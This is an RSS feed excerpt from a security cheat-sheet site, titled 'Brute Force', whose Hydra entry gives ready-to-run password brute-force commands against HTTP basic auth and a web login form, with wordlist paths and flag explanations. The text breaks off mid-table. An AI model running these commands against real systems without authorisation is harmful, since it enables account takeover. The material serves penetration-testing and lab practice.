channel.title: Brute Force on TLDRBins
channel.description: Recent content in Brute Force on TLDRBins

item.title: Hydra
item.description: HTTP basic auth hydra -L usernames -P passwords -s 8080 -f example.com http-get / +-------------------------------------------+ | -s : port | | -L : usernames file | | -P : passwords file | | -f : exit when a login/pass pair is found | +-------------------------------------------+ Web Page Login Form hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form "/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password" +-------------------------------------------+ | -l : username | | -P : wordlist | | http-post-form : service | | /login.
